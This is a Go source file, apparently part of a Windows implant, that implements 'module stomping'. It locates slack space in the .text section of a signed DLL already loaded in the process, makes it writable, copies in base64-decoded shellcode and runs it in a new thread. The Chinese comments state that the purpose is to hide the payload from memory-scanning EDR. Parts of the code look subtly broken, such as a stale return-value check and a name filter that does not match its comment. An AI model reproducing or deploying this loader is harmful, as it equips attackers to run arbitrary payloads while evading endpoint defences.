//go:build windows && !light

package main

import (
	"encoding/base64"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── 模块伪造（Module Stomping）─────────────────────────────────────
// 在已加载的合法（签名）DLL 的 .text 段找足够大的空洞，把 payload 拷贝进去，
// 然后用 payload 的入口地址执行。相比 VirtualAlloc 新分配 RWX 内存，
// 内存扫描型 EDR 看到的是"合法模块地址空间内的可执行代码"，隐蔽性更好。
//
// 实现：遍历当前进程已加载模块（K32EnumProcessModules），对每个模块读
// PE 头找 .text 节，计算节内未初始化/对齐空洞；空洞 ≥ payload 大小则驻留。
//
// ⚠️ 实验性：写入只读节需临时改页保护（VirtualProtect），完成后还原；
// 空洞内已有代码会被覆盖（选用 .text 尾部的对齐空洞，不影响原功能）。

// moduleStomp 在已加载模块的 .text 空洞驻留 shellcode 并返回入口地址。
func moduleStomp(shellcode []byte) (uintptr, error) {
	procEnumModules := resolveAPI("psapi.dll", "K32EnumProcessModules")
	procGetModuleBaseName := resolveAPI("psapi.dll", "K32GetModuleBaseNameW")
	procGetModuleInfo := resolveAPI("psapi.dll", "K32GetModuleInformation")
	procVirtualProtect := resolveAPI("kernel32.dll", "VirtualProtect")
	procFlushICache := resolveAPI("kernel32.dll", "FlushInstructionCache")
	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")

	// 当前进程句柄
	curProc, _, _ := resolveAPI("kernel32.dll", "GetCurrentProcess").Call()

	// 枚举模块
	const maxModules = 256
	mods := make([]uintptr, maxModules)
	var needed uint32
	r1, _, _ := procEnumModules.Call(curProc, uintptr(unsafe.Pointer(&mods[0])), uintptr(len(mods)*int(unsafe.Sizeof(uintptr(0)))), uintptr(unsafe.Pointer(&needed)))
	if r1 == 0 {
		return 0, fmt.Errorf("K32EnumProcessModules failed")
	}
	count := int(needed) / int(unsafe.Sizeof(uintptr(0)))
	if count > maxModules {
		count = maxModules
	}

	type moduleInfo struct {
		baseOfDll   uintptr
		sizeOfImage uint32
		entryPoint  uintptr
	}

	for i := 0; i < count; i++ {
		mi := &moduleInfo{}
		r2, _, _ := procGetModuleInfo.Call(curProc, mods[i], uintptr(unsafe.Pointer(mi)), uintptr(unsafe.Sizeof(*mi)))
		if r2 == 0 || mi.sizeOfImage == 0 {
			continue
		}
		// 跳过自身与已知敏感模块（避免破坏）
		if strings_containsImageName(mods[i], curProc, procGetModuleBaseName) {
			continue
		}

		// 读 PE 头找 .text 节空洞
		off, size := findTextHole(mi.baseOfDll, mi.sizeOfImage, len(shellcode))
		if off == 0 {
			continue
		}
		dst := mi.baseOfDll + off

		// 临时改页保护为可写（保留执行位）
		var oldProt uint32
		if _, _, _ = procVirtualProtect.Call(dst, uintptr(size), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProt))); r1 == 0 {
			continue
		}
		// 拷贝 shellcode
		dstPtr := (*[1 << 24]byte)(unsafe.Pointer(dst))
		copy(dstPtr[:size], shellcode)
		// 刷新指令缓存
		procFlushICache.Call(^uintptr(0), dst, uintptr(size))
		// 还原保护（若原保护非 RWX）
		if oldProt != windows.PAGE_EXECUTE_READWRITE {
			procVirtualProtect.Call(dst, uintptr(size), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
		}
		_ = procCloseHandle
		return dst, nil
	}
	return 0, fmt.Errorf("no module .text hole large enough (%d bytes)", len(shellcode))
}

// findTextHole 在模块内找 .text 节尾部对齐空洞（≥need 字节）。
// 返回（空洞偏移, 空洞大小）；找不到返回 (0,0)。
func findTextHole(base uintptr, imageSize uint32, need int) (uintptr, uint32) {
	if imageSize < 0x1000 {
		return 0, 0
	}
	// PE 头：DOS e_lfanew @0x3C
	peOff := uintptr(*(*uint32)(unsafe.Pointer(base + 0x3C)))
	if peOff+0x18 > uintptr(imageSize) {
		return 0, 0
	}
	// Optional header 起始 = peOff + 4(PE sig) + 20(COFF)
	optOff := peOff + 4 + 20
	if optOff+0x70 > uintptr(imageSize) {
		return 0, 0
	}
	numSections := *(*uint16)(unsafe.Pointer(base + peOff + 4 + 2))
	sectionTable := optOff + uintptr(*(*uint16)(unsafe.Pointer(base + optOff + 16)))
	if sectionTable == optOff+16 {
		return 0, 0
	}

	for i := 0; i < int(numSections); i++ {
		sec := sectionTable + uintptr(i)*40
		if sec+40 > uintptr(imageSize) {
			break
		}
		name := (*[8]byte)(unsafe.Pointer(base + sec))
		if name[0] != '.' || name[1] != 't' || name[2] != 'e' || name[3] != 'x' || name[4] != 't' {
			continue
		}
		virtualSize := uint32(*(*uint32)(unsafe.Pointer(base + sec + 8)))
		virtualAddr := uint32(*(*uint32)(unsafe.Pointer(base + sec + 12)))
		rawSize := uint32(*(*uint32)(unsafe.Pointer(base + sec + 16)))
		// 空洞 = virtualSize 与 rawSize 对齐到页的差距（.text 尾部未映射对齐区）
		alignedVS := (virtualSize + 0xFFF) &^ 0xFFF
		if rawSize > alignedVS {
			rawSize = alignedVS
		}
		holeSize := alignedVS - rawSize
		if holeSize >= uint32(need) && virtualAddr+rawSize+uint32(need) <= imageSize {
			return base + uintptr(virtualAddr+rawSize), holeSize
		}
	}
	return 0, 0
}

// strings_containsImageName 简化：读取模块基名判断是否含 "toshell"/"implant"。
func strings_containsImageName(mod uintptr, curProc uintptr, procGetModuleBaseName *apiProc) bool {
	buf := make([]uint16, 260)
	r, _, _ := procGetModuleBaseName.Call(curProc, mod, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if r == 0 {
		return false
	}
	name := windows.UTF16ToString(buf)
	for i := 0; i+6 < len(name); i++ {
		if name[i] == 't' && name[i+1] == 'o' && name[i+2] == 's' && name[i+3] == 'h' && name[i+4] == 'e' && name[i+5] == 'l' {
			return true
		}
	}
	return false
}

// stompShellcode 任务入口：base64 shellcode → 模块空洞驻留 → 回调执行。
func stompShellcode(dataB64 string) (string, int32, string) {
	raw, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
	}
	entry, err := moduleStomp(raw)
	if err != nil {
		return "", -1, fmt.Sprintf("module stomp failed: %v", err)
	}
	// 在新线程执行（避免阻塞当前线程）
	procCreateThread := resolveAPI("kernel32.dll", "CreateThread")
	h, _, _ := procCreateThread.Call(0, 0, entry, 0, 0, 0)
	if h == 0 {
		return "", -1, "CreateThread failed"
	}
	return fmt.Sprintf("shellcode stomped into module at 0x%x (%d bytes)", entry, len(raw)), 0, ""
}
